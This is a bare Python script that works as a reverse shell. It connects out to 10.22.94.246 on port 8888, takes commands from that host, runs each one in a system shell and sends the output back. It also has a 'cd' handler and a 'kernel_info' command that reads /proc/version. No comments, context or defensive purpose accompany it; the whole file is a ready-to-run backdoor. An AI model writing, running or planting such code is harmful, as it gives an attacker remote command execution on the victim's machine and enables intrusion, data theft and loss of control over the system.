import socket
import subprocess
import os

s = socket.socket()
s.connect(('10.22.94.246', 8888))

while True:
    cmd = s.recv(1024)
    if cmd[:2] == 'cd':
     os.chdir(cmd[3:])
     dir = os.getcwd()
     s.sendall('bacod')
    elif cmd == 'kernel_info':
     results = subprocess.Popen('cat /proc/version', shell=True,
               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
               stdin=subprocess.PIPE)
     results = results.stdout.read() + results.stderr.read()

     s.sendall(results)

    else:
     results = subprocess.Popen(cmd, shell=True,
               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
               stdin=subprocess.PIPE)
     results = results.stdout.read() + results.stderr.read()

     s.sendall('\n'+results)